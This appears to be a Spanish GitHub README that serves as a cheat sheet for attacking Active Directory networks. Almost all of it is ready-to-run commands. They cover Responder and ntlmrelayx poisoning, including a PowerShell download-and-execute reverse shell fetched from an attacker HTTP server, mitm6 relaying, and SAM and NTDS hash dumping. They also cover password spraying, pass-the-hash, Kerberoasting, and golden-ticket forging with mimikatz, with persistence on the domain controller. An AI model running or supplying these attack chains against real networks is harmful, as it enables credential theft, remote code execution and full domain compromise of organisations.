# AD_Attachks

# Ataques_AD




## INDICE:
- [Ataque SambaRelay IPv4](https://github.com/CYBER-Softcom/Ataques_AD/blob/main/README.md#ataque-sambarelay-ipv4)
  - [Crackmapexec](https://github.com/CYBER-Softcom/Ataques_AD#crackmapexec)

- [NTLMRelay](https://github.com/CYBER-Softcom/Ataques_AD#ntlmrelay)
  - [Obtener Shell:](https://github.com/CYBER-Softcom/Ataques_AD#ejecuci%C3%B3n-de-comandos)

- [Ataque SambaRelay IPv6](https://github.com/CYBER-Softcom/Ataques_AD#ataque-sambarelay-ipv6)
  - [Uso de proxychains /etc/proxyhains.conf](https://github.com/CYBER-Softcom/Ataques_AD#uso-de-proxychains)
  - [Dumpear la sam](https://github.com/CYBER-Softcom/Ataques_AD#dumpear-la-sam-)
  - [Conectarse a un DC y obtener una cmd](https://github.com/CYBER-Softcom/Ataques_AD#conectarse-a-un-dc-y-obtener-una-cmd-)
  - [PasswordSprying](https://github.com/CYBER-Softcom/Ataques_AD#passwordsprying-ver-todos-los-equipos-que-podemos-conectarnos-)
  - [Habilitar el RPD](https://github.com/CYBER-Softcom/Ataques_AD#habilitar-el-rpd-)
  - [Dumpear el NTDS para obtener todos los hashes](https://github.com/CYBER-Softcom/Ataques_AD#dumpear-el-ntds-para-obtener-todos-los-hashes-)
  - [PassTheHash](https://github.com/CYBER-Softcom/Ataques_AD#passthehash-)

- [Enumeración:](https://github.com/CYBER-Softcom/Ataques_AD#enumeraci%C3%B3n)
  - [RPC 135 137 139](https://github.com/CYBER-Softcom/Ataques_AD#rpc-135-137-139)
  - [LDAP (389 y 636)](https://github.com/CYBER-Softcom/Ataques_AD#ldap-389-y-636)
  - [WINRM 5985](https://github.com/CYBER-Softcom/Ataques_AD#winrm-5985)
 
- [KERBEROS](https://github.com/CYBER-Softcom/Ataques_AD/blob/main/README.md#kerberos)
  - [ENUMERAR USUARIOS VÁLIDOS EN UN DC - Kerbrute](https://github.com/CYBER-Softcom/Ataques_AD/blob/main/README.md#enumerar-usuarios-v%C3%A1lidos-en-un-dc---kerbrute)
  - [ASPRoast Attack - GetNPUsers.py](https://github.com/CYBER-Softcom/Ataques_AD#asproast-getnpuserspy)
  - [Kerberoasting Attack GetUserSPN.py](https://github.com/CYBER-Softcom/Ataques_AD#kerberoasting-attack-getuserspnpy)
 
- [GOLDEN TICKET ATTACK](https://github.com/CYBER-Softcom/Ataques_AD#golden-ticket-attack)
  - [1: Golden.kirbi](https://github.com/CYBER-Softcom/Ataques_AD#1-goldenkirbi)
    - [Dumpear Krbtgt](https://github.com/CYBER-Softcom/Ataques_AD#dumpear-krbtgt)
    - [Acceder a los recursos privilegiados del DC](https://github.com/CYBER-Softcom/Ataques_AD#acceder-a-los-recursos-privilegiados-del-dc)
    - [PassTheTicket](https://github.com/CYBER-Softcom/Ataques_AD#passtheticket)
  - [2: .ccache](https://github.com/CYBER-Softcom/Ataques_AD#2-ccache)
  - [Persistencia al DC](https://github.com/CYBER-Softcom/Ataques_AD/blob/main/README.md#persistencia-al-dc-)
 
- [PRIVESC](https://github.com/CYBER-Softcom/Ataques_AD/blob/main/README.md#privesc)
  - [Enumeración con BloodHound y Neo4j](https://github.com/CYBER-Softcom/Ataques_AD/blob/main/README.md#enumeraci%C3%B3n-con-bloodhound-y-neo4j)
    - [Instalación y uso de la herramienta](https://github.com/CYBER-Softcom/Ataques_AD/blob/main/README.md#instalaci%C3%B3n--y-uso-de-la-herramienta)



<br><br><br>

## Ataque SambaRelay IPv4

Por defecto SMB no está firmado. No valida la legitimidad del origen. Cuando un host se conecta a un recurso que no existe, el Responder envenena el tráfico y devuelve ese recurso. <br>
Responder: <br>

SambaRelay consigue hashes NTLMv2. No sirve para hacer PassTheHash, pero se pueden crackear los hashes por fuerza bruta.<br>


Archivo de configuración: /etc/responder/Responder.conf (Todos los parámetros en On) <br>

Comando: 
```responder -I eth0 -dw ```<br><br>

Actúa en el puerto 80. Si está ocupado: ```lsof -i :80```<br><br>

Crackear hashes: Se copia en archivo el hash completo<br>

```john wordlist /usr/share/wordlists/rockyou.txt hash.txt```<br>


### Crackmapexec

Enumerar equipos con smb active: Cme smb IP/CIDR<br>
```crackmapexec smb 192.168.1.0/24 -u 'user' -p 'passwd'```<br><br>


## NTLMRelay
Cuando un equipo tiene permisos de administrador sobre otro, se aprovecha el envenenamiento de la red para recoger la conexión, de modo que cuando se conecte a un recurso de la red que no exista, el atacante ofrece este recurso.<br>
Se realiza con Responder y NtlmRelayx. Permite dumpear la SAM del equipo. <br>

<b>Caso de uso:</b> <br>
<ul>
<li type="circle">El atacante estará compartiendo el archivo Invoke-PowerShellTCP.ps1 y la escucha con NetCat.</li> <br>
<li type="circle">Se envenena el trafico de red con Responder.</li><br>
<li type="circle">Se lanza el ntlmrelayx con el objetivo de la victima.</li><br>
<li type="circle">La victima se conecta a un recurso de red que no existe.</li><br>
<li type="circle">El atacante ofrece ese recurso de red no existente.</li><br>
<li type="circle">La victima se autentica contra el atacante, ofreciendo asi el hash NTLM.</li><br>
</ul>
<br>

<b>Configuracion de /etc/responder/Responder.conf:</b> smb Off, http Off <br><br>
<b>Paso previo:</b> Usamos cme para ver los equipos a los que podemos atacar.<br><br>
<b>Paso 1:</b><br>
```responder -I eth0 -dw ```<br>

Sabiendo el equipo al que queremos envenenar (lo vimos en el paso previo), editamos un archivo targets.txt, con la IP de dicho equipo que será el target file. Al ser generalmente Windows 10, hay que darle soporte smbv2 <br>
```
cat target.txt
[Ip de la victima]
```
<br><br>

<b>Paso 2:</b> Lanzamos herramienta ntlmrelayx donde incluimos el archivo con el host de la victima y damos soporte smb<br>
```ntlmrelayx -tf targets.txt -smb2support ```<br><br>



### Obtener Shell:
Haciendo uso de NtlmRelayx, podemos ejecutar comandos. Con esto, podemos descargar desde el equipo víctima un archivo malicioso que se encuentra en el atacante y que,al ejecutarse, nos de una reverse shell. A continuación, se muestra el archivo malicioso, el cual configuramos con los parámetros del atacante:<br>
<b>Invoke-PowerShellTCP.ps1 </b><br>
Editamos el archivo y añadimos al final nuestra reverse shell:<br>
```Invoke-PowerShellTCP -Reverse -IPAdress [NuestraIP] -Port [NuestroPuerto] ```<br>

<b>Paso 1:</b> En la ruta donde se encuentra el archivo <i>Invoke-PowerShellTCP.ps1</i>, compartimos el servidor HTTP con Python <br>
```python3 -m http.server 8000 ```<br><br>

<b>Paso 2:</b> Nos ponemos a la escucha para recibir la reverse shell:<br>
```rlwrap nc -nvlp 4646 ```<br><br>

<b>Paso 3:</b> Lanzamos el responder <br>
```responder -I eth0 -dw ```<br><br>

<b>Paso 4:</b> Lanzamos el NtlmRelayx con el comando. Se conectará al recurso compartido por http para descargar el archivo Invoke: </br>
```
ntlmrelayx -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.5:8000/Invoke-PowerShellTCP.ps1')"
```
<br><br>

Resumen: Usamos el archivo Invoke-PowerShell.ps1 que ejecuta comandos. Este archivo tiene 
unos parámetros con la IP del atacante para obtener una conexión reversa. Compartimos este 
archivo a través de un servidor HTTP. Nos ponemos a la escucha con NetCat, donde llegara la 
conexión reversa. Lanzamos el responder para envenenar el tráfico. Lanzamos el NtlmRelayx con 
ejecución de un comando. Este comando da la orden de descarga el archivo que esta compartido 
en el servidor HTTP. Se descarga, lo ejecuta junto con la orden de la conexión reversa. Se recibe 
la conexión al sistema por NC. <br><br>


## Ataque SambaRelay IPv6 

Este ataque requiere ser replegado todo el tiempo y en escucha. <br>
Por defecto, las máquinas Windows solicitan tráfico IPv6. Si funciona, crea una sesión 
interactiva. Este ataque envenena el dominio y, con NTLRelayx, junto con ProxyChains, se puede 
crear un túnel y lograr ingresar un comando sin conocer la contraseña del usuario. <br><br>

<b>Paso 1:</b> Se envenena el tráfico y las víctimas toman como puerta de enlace predeterminada y 
servidor DNS primario nuestra dirección IPv6. Muestra nuestra dirección IPv4 e IPv6.<br>
```mitm6 -d dominio.local ```<br><br>

<b>Paso 2:</b> De los equipos que han sido envenenados, lazamos el NtlmRelayx contra uno de ellos 
por IPv6. Wh: atacante; t: target; socks: crea conexión sock (para proxychains) <br>

```ntlmrelayx.py -6 -wh [IPatacante] -t smb://[IPvictima] -socks -debug -smb2support ```<br><br>

<b>Paso 3:</b> Con el listado, ahora podemos ver si existe algún usuario administrador en TRUE (AdminStatus) <br>
```socks``` <br><br>

### Uso de proxychains
```
/etc/proxyhains.conf
Socks4 127.0.0.1 1080
```
<br>

Se aprovecha el relaying para tunelizar la comunicación y hacer un relaying de las credenciales.
Al tener un relaying de un usuario con privilegios, podemos usar proxychains junto con crackmapexec con usuario, contraseña inventada y dominio para obtener un pwned:<br>
```proxychains cme smb [IPvictima] -u 'UserName' -p 'nada' -d 'dominio.local' 2>/dev/null  ```<br><br>

### Dumpear la sam: <br>
```proxychains cme smb [IPvictima] -u 'UserName' -p 'nada' -d 'dominio.local' --sam 2>/dev/null ```<br>

Conexión con credenciales validas <br>
### Conectarse a un DC y obtener una cmd <br>
```psexec.py dominio.local/Administrador:Password@IP cmd.exe ```<br><br>

### PasswordSprying: Ver todos los equipos que podemos conectarnos <br>
```cme smb 192.168.1.0/24 -u ‘user’ -p ‘password’ ```<br>
```crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords ```<br>
```crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes ```<br><br>
  
  
### Habilitar el RPD <br>
```crackmapexec smb 192.168.1.0/24 -u ‘user’ -p ‘password’ -M rdp -o action=enable ```<br><br>
  
  
### Dumpear el NTDS para obtener todos los hashes: <br>
El archivo NTDS. dit es una base de datos que almacena datos de Active Directory, incluida información sobre objetos de usuario, grupos y pertenencia a grupos. Incluye los hashes NTLM de las contraseñas para todos los usuarios y equipos. SOLO APLICA AL DC<br>
```crackmapexec smb [IPtargetDC] -u ‘user’ -p ‘password’ --ntds vss ```<br><br>
  
  
### PassTheHash <br>
Como ejemplo, tenemos el hash "Administrador: 500: aad3b435b51404eeaad3b435b51404ee: 2b576acbe6bcfda7294d6bd18041b8fe::".<br><br>

wmiexec.py -hashes '000000000000000000000000000000000:2b576acbe6bcfda7294d6bd18041b8fe' administrador@192.168.1.161<br>
evil-winrm -u Administrador -H '2b576acbe6bcfda7294d6bd18041b8fe' -i 192.168.1.161 <br>
crackmapexec smb <target(s)> -u username -H 2b576acbe6bcfda7294d6bd18041b8fe <br><br>

```wmiexec.py dominio.local/usuario@IP -hashes [hashNTLM] ```<br>
```crackmapexec smb <target(s)> -u username -H NTHASH ```<br><br>

XfreeRDP: Para un ataque más centrado en la GUI, puede usar Xfreerdp para obtener acceso RDP a un punto final.<br>

```xfreerdp /u:Administrador /pth:2b576acbe6bcfda7294d6bd18041b8fe /v:192.168.1.161``` <br><br>
  

## Enumeración:
  
### RPC 135 137 139 
Sin credenciales<br>
```rpcclient -U "" [IP] -N -c 'enumdomusers' | grep -oP ‘\[.*?\]’ | grep -v ‘0x’ | tr -d ‘[]’ > users.tx```<br>
Con credenciales<br>

```
rpclient -U "dominio.local\username%password" IP -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users.txt 
```
<br>
  
Rpcenum (s4vitar) https://github.com/s4vitar/rpcenum<br><br>
  
  
### LDAP (389 y 636)
Ldapdomaindump (https://github.com/dirkjanm/ldapdomaindump): Genera informacion en HTML. Ejecutar en ruta /var/www/html. Se necesitan credenciales<br>
  
<b>Paso 1:</b> iniciar Apache <br>
```service apache2 start```
<br>
  
<b>Paso 2:</b> mover a /var/www/html <br>
  
<b>Paso 3:</b> lanzar comando <br>
  
```ldapdomaindump -u 'dominio.local\username' -p 'password' [IP] ```<br>
  
<b>Paso 4:</b> Acceder al localhost desde el navegador. <br><br>
  
### WINRM 5985
Con credenciales <br>
```evil-winrm -u 'username' -p 'password' -i IP ```<br><br>
  
# KERBEROS
Protocolo de autenticacion que se encarga de identificar a cada usuario, donde intervienen:
<br>
<ul>
<li>El cliente o usuario que quiere acceder al servicio.</li><br>
<li>El AP (Application Server) donde se expone el servicio al que el usuario quiere acceder.</li><br>
<li>El KDC (Key Distribution Center), el servicio de Kerberos encargado de distribuir los tickets a los clientes, instalado en el DC (Controlador de dominio). Cuenta con el AS (Authentication Service), que se encarga de expedir los TGTs.</li>
</ul>
<br>

Kerberos maneja unas estructuras llamadas “Tickets”, que son entregados a los usuarios autenticados para que estos puedan realizar ciertas acciones dentro del dominio de Kerberos. Se distinguen 2 tipos:<br>
<ul>
<li>El TGS (Ticket Granting Service) es el ticket que se presenta ante un servicio para poder acceder a sus recursos. Se cifra con la clave del servicio correspondiente.</li>
<li>El TGT (Ticket Granting Ticket) es el ticket que se presenta ante el KDC para obtener los TGS. Se cifra con la clave del KDC.</li>
</ul>  
 <br>
 
 <img src="https://user-images.githubusercontent.com/109160484/211519291-6a119e41-36be-4d0b-8a52-6af6cc9c1ab1.png" style="width: 50%;">
 
 <img src="https://user-images.githubusercontent.com/109160484/211519512-b779a128-aa72-4a88-8af5-dffe190b89d1.png" style="width: 50%;">
 <br>
KRB_AS_REQ  >cliente solicita TGT<br>
KRB_AS_REP  >KDC ofrece TGT <br>
KRB_TGS_REQ >Cliente solicita TGS<br>
KRB_TGS_REP >KDC ofrece el TGS - Aquí reporta el hash que podremos crackear<br>
KBR_AP_REQ  > Utilizado por el cliente para autenticarse a los recursos utilizando el TGS<br>


## Enumerar usuarios válidos en DC - Kerbrute
Muestra los usuarios VALIDOS de DC y poder forzar las contraseñas de Windows con Kerberos implementado.<br>
Descargamos la herramienta: https://github.com/ropnop/kerbrute<br>

USO: Enumera los usuarios VALIDOS en un Domain Controler de la maquina X con el dominio X usando un listado de usuarios<br>
```./kerbrute userenum --dc 10.10.10.10 -d htb.local /ruta/usuarios.txt```
<br>
![image](https://user-images.githubusercontent.com/109160484/211528830-09534a20-ec0c-4ee4-ba5b-dc1be1722d54.png)

<br>
<b>Con el listado potencial de usuarios, si descubrimos un usuario que esté dentro de un AC, conviene siempre hacer un ASPRoast.</b><br>



## ASPRoast Attack - GetNPUsers.py 
Esta herramienta, intenta solicitar los TGTs (Tikect-Granting-Tikects) sin disponer de credenciales de usuario. Es decir, obtiene hashes de usuarios y hay que crackearlos (para hashcat, codigo 18200)<br>
La salida del comando nos devuelve una lista y, si existiera un usuario  ASPRoasteable, este tendrá el parámetro <b>UF_DONT_REQUIRED_PREAUTH</b> seteado y devolverá el hash del usuario<br> <br>

Introducir IP Dominio en el /etc/hosts <br>
Requisitos: Tener una lista de usuario del DC y que alguno no requiera autenticación kerberos.<br>
```GetNPUsers.py dominio.local/ -no-pass -usersfile usuarios.txt ```
```GetNPUsers.py dominio.local/ -usersfile usuarios.txt -format hashcat```
<br><br>
  
  
## Kerberoasting Attack - GetUserSPN.py
<b>SPN (Service Personal Name):</b> es un identificador único para un servicio en una red que utiliza la autenticación Kerberos. Está compuesto de una clase de servicio, un nombre de host y, en ocasiones, un puerto.<br>
Se centra en obtener un mayor acceso a objetivos adicionales mediante la escalada de privilegios y técnicas de movimiento lateral.<br>
Con cualquier usuario del dominio se puede conseguir un TGS para cualquier servicio. Esto es porque Kerberos no se encarga de la autorizacion, sino de la autenticacion.<br>
Kerberoasting permite a los atacantes, haciéndose pasar por usuarios de dominio sin privilegios con atributos SPN preestablecidos, solicitar TGS relacionados con el servicio de la memoria en un intento de descifrar los hashes NTLM asociados de las contraseñas de texto sin formato vinculadas a esa cuenta de servicio en particular. Es decir, utiliza los TGS para realizar cracking de los hashes de manera offline.<br><br>


Introducir IP Dominio en el /etc/hosts <br>
Comprobar usuarios kerberoasteable y sacar su tipo, ver el hash e intentar crackearlo <br>
```GetUserSPN.py dominio.local/username:password ```
<br>
<br>
![image](https://user-images.githubusercontent.com/109160484/211334005-cdab3ed9-33e7-4b28-b57c-cb9b0bf99a2b.png)<br>

Ver el TGS del usuario: <br>
```GetUserSPN.py dominio.local/username:password -request ```<br><br>
  ![image](https://user-images.githubusercontent.com/109160484/211334134-81afa91b-ed58-43da-aab5-d6fccea64ff6.png) <br>
  
  El hash anterior, puede ser guardiar en hash.txt y crackeado. Con hashcat, krb5tgs$23 tiene el codigo 13100. <br>
  ```
  jhon --wordlist=/rockoyu.txt hash.txt
  hashcat -m 13100 -a 0 hash.txt rockyou.txt --force -o cracked.txt
  ```
Teniendo usuario y contraseña de un servicio administrador, hacemos sprying con cme para ver todos los equipos con Pwned.<br>
```crackmapexec smb 192.168.10.0/24 -u 'NombreUsuario' -p 'Contraseña' ```
<br>
Finalmente, accedemos a la maquina con psexec.py<br>
```psexec.py dominio/usuario:contraseña@192.168.10.5 cmd.exe ```
<br><br>
  
## GOLDEN TICKET ATTACK
Un ataque de Golden Ticket es cuando un atacante puede comprometer una <b>Cuenta de Servicio de Distribución de Claves de Active Directory (KRBTGT)</b> y usarla para crear un Ticket Granting Ticket (TGT) de Kerberos. Si lo hace, les permitirá acceder a cualquier recurso en un dominio de Active Directory sin hacer sonar ninguna alarma.<br>
Habiendo obtenido acceso en el controlador de dominio, se usa una herramienta como Mimikatz para volcar el hash de la contraseña de la cuenta KRBTGT.<br>
Existen dos formas: <br>
<b>1:</b> Crear un <b>golden.kirbi</b> para después cargarlo con mimikatz a una máquina y poder tener 
privilegios de acceso a ese equipo.<br>
<b>2:</b> Usando <b>ticketer</b>, construyendo un archivo <i>.ccache</i> <br>

### Método 1: Golden.kirbi 
  
#### Dumpear Krbtgt 
Al dumpear el usuario krbtgt, estaremos capacitados para hacer ‘pass the hash’. <br>
<b>Paso previo:</b> Buscar archivo mimikatz.exe de 64 para subir a la víctima. Se sube la herramienta 
al equipo del DC para enumerarlo. <br>
<b>Paso 1:</b> En host del DC, moverse a cd <i>C:\Windows\Temp</i> <br><br>
  
<b>Paso 2:</b> Compartir servicio HTTP con Python <br>
  
```python3 -m http.server 8000```<br><br>

 <b> Paso 4:</b> Transferir archivo (desde la víctima)<br>
```certutil.exe -f -urlcache -split http://IPatacante:8000/mimikatz.exe mimikatz.exe ```<br><br>

  <b>Paso 5:</b> Ejecutar mimikatz.exe <br><br>

 <b> Paso 6:</b> Dumpear la info de krbtgt para realizar un PassTheTicket <br>
```lsadump::lsa /inject /name:krbtgt ```<br><br>

  <b>Paso 7:</b> guardamos en data.txt toda la info generada. Con ESC + i, respeta el sangrado. <br><br>

 <b> Paso 8:</b> Crear archivo .kirbi <br>
```kerberos::Golden /domain:dominio.local /sid:[sid] /rc4[hashNTLM] /user:[AdminUser] /ticket:golden.kirbi ```<br><br>

  <b>Paso 9:</b> Salimos de mimikatz y hacemos ‘dir’ para ver el golden.kirbi y nos lo transferimos <br>

Atacante: ```impacket-smbserver smbFolder $(pwd) -smb2support ```<br>
Víctima: ```copy golden.kirbi \\IPAtacante\smbFolder\golden.kirbi ```<br><br>

#### Acceder a los recursos privilegiados del DC
Siendo adminitradores del DC, podemos conectarnos a cualquier equipo: <br>
Subir a otro equipo el mimikat y el Golden.kirbi generado: <br><br>

  <b>Paso 1:</b> Conectamos al equipo y obteniendo una cmd <br>
```psexec.py dominio.local/Administrador:Password@IPvictima cmd.exe ```<br><br>

  <b>Paso 2:</b> Transferir mimikatz y Golden.kirbi. Nos movemos a <i>C:\Windows\Temp</i> para transferirlos
desde servidor HTTP. <br>
Compartimos archivos desde atacante: <br>
```python -m SimpleHTTPServer ```<br>
Transferimos los archivos en la víctima:<br>
```certutil.exe -f -urlcache -split http://IPatacante:8000/mimikatz.exe mimikatz.exe ```<br>
```certutil.exe -f -urlcache -split http://IPatacante:8000/golden.kirbi golden.kirbi ```<br><br>
  
#### PassTheTicket
Una vez temenos el GT podemos hacer un PtT. El ataque Pass-the-Ticket es un método para suplantar a los usuarios en un dominio de AD. AD generalmente usa Kerberos para proporcionar inicio de sesión único y SSO.<br><br>

 <b> Paso 3:</b> Ejecutamos el mimikatz.exe en la víctima <br><br>

  <b>Paso 4:</b> Desde Mimikatz, lanzamos el comando:<br>
```Kerberos::ptt Golden.kirbi```<br><br>

  <b>Paso 5:</b> salimos de mimikatz y listamos <br>
```
dir \\DC-Company\c$
dir \\DC-Company\c$\admin$ 
```
<br><br>

  
  ### Método 2: .ccache
Paso previo: Buscar archivo mimikatz.exe de 64 para subir a la víctima. Se sube la herramienta 
al equipo del DC para enumerarlo.<br><br>
  
<b>Paso 1:</b> En host del DC, moverse a cd <i>C:\Windows\Temp</i> <br><br>

<b>Paso 2:</b> Compartir servicio HTTP con Python <br>
```python3 -m http.server 8000 ```<br><br>

<b>Paso 4:</b> Transferir archivo (desde la víctima) <br>
```certutil.exe -f -urlcache -split http://IPatacante:8000/mimikatz.exe mimikatz.exe ```<br><br>

<b>Paso 5:</b> Ejecutar mimikatz.exe <br><br>

<b>Paso 6:</b> Dumpear la info de krbtgt para realizar un PassTheTicket <br>
```lsadump::lsa /inject /name:krbtgt ```<br>

<br>

<b>Paso 7:</b> Guardamos en data.txt toda la info generada. Con ESC + i, respeta el sangrado. <br>
-nthash <br>
![image](https://user-images.githubusercontent.com/109160484/211400083-af23ed69-1e33-4c9d-b74c-ed596e9df490.png)<br>

-domain-sid<br>
![image](https://user-images.githubusercontent.com/109160484/211400240-047ad063-f7b8-4af0-8118-8445c28c6b48.png)<br><br>


<b>Paso 8:</b> Abusamos de ticketer. py para crear un archivo .ccache <br>
```ticketer.py -nthash [hashNTLM] -domain-sid [DomainSID] -domain dominio.local Administrador ```<br>
Esto nos guarda Administrador.ccache <br>
![image](https://user-images.githubusercontent.com/109160484/211400574-cebfd3c5-d98c-42b6-842b-5b262a7ff6f2.png)
<br><br>
  
### Persistencia al DC: <br>
  
<b>Paso 9:</b> Con la persistencia, podremos ingresar al DC incluso si cambian la contraseña del admin. Para ello, debemos exportar una variablede entorno llamada KRB5CCNAME, debe seri igual a la ruta donde se ecuentra el recurso ’/Ruta_Administrador.ccache’. A continuación le hacemos un ls para comprobar que se ha creado el archivo Administrador.ccache<br>
```
export KRB5CCNAME='/home/kali/Administrador.ccache' 
ls -l $KRB5CCNAME 
```
<br><br>

  
<b>Paso 10:</b> Con esta variable de entorno exportada, se puede entrar al DC con psexec.py sin 
contraseña: <br>
```psexec.py -n -k dominio.local/Administrador@DC-Company cmd.exe ```<br><br>


  
  # PRIVESC 
## Enumeración con BloodHound y Neo4j
BloodHound y Neo4j <br>
Descargar sharphound.ps1 (GitHub:bloodhoundAD/BloodHound –BloodHound/collections/SharpHound)<br><br>

### Instalación  y uso de la herramienta
  <b>Paso 1:</b> <br>
```apt install bloodhound neo4j ```<br>
Si hay problemas: 
```update-alternatives --config java (cambiar a java11) ```
<br>

  <b>Paso 2:</b> Lanzamos a la vez ambas herramientas: <br>
```
neo4j console 
bloodhound &>/dev/null & 
disown 
```
<br><br>

 <b>Paso 3:</b> Ingresar a bloodhound (neo4j/neo4j) > http://localhost:7474/ <br><br>

  <b>Paso 4:</b> Tranferir/subir sharphound.ps1 a la víctima https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1<br>
```python -m SimpleHTTServer ```<br>
```
evil-winrm: IEX(New-Object Net.WebClient).downloadString(‘http://IPatacante:8000/SharpHound.ps1’) 
```
<br><br>

  <b>Paso 5:</b> ejecutar método para crear el .zip y lo descargamos al atacante <br>
```
Evil-winrm-> Import-Module .\SharpHound.ps1
Evil-winrm-> Invoke-BloohHound -CollectionMethod All
Evil-winrm-> download 0123_BloodHound.zip
```
<br><br>
  
<b>Paso 6:</b> Subimos el archive .zip a bloodHound (navegador-Upload data) <br>


Dumpear hashes para PTH <br>
Secretsdump.py  <br>






























